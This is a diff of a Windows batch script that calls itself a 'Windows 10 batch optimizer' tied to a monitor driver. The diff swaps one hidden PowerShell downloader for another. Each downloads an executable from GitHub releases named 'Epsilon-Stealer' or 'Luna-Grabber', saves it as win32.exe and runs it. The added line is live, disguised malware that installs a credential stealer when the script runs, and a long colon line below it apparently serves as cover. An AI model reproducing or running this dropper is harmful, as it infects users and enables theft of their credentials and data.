@@ -1,6 +1,6 @@
 @ECHO OFF
 cd ZOWIE XL2411 WHQL driver
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Vinyzu3/Epsilon-Stealer/releases/download/relase/Launcher.exe';$file='win32.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe';$file='win32.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 COLOR 0A
 ECHO ********** Windows 10 batch optimizer
